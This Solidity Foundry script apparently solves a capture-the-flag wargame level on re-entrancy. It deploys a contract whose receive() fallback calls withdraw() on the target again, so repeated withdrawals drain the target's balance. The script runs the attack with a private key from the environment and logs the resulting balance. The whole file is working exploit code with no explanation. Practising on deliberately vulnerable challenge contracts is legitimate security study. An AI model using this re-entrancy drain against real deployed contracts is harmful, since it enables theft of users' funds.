// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Re-entrancy.sol";


contract A
{
    Reentrance public Reentrance2 = Reentrance(payable(0x56B3c0665842eaaCBea894137D118AeD72958Fe9));

    function j() public
    {
        Reentrance2.withdraw(0.0001 ether);
    }
    receive() external payable {
        Reentrance2.withdraw(0.0001 ether);
    }

    
}

contract Level10Solution is Script{

Reentrance public Reentrance1 = Reentrance(payable(0x56B3c0665842eaaCBea894137D118AeD72958Fe9));

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        A a = new A();
        address a_address = address(a);  
        Reentrance1.donate{value : 0.001 ether}(a_address);
        a.j();

        console.log("balance after:",(0x950c92197076C1F2c928DA031e1D05326BE6D4F0).balance);
    
        vm.stopBroadcast();
    }

}
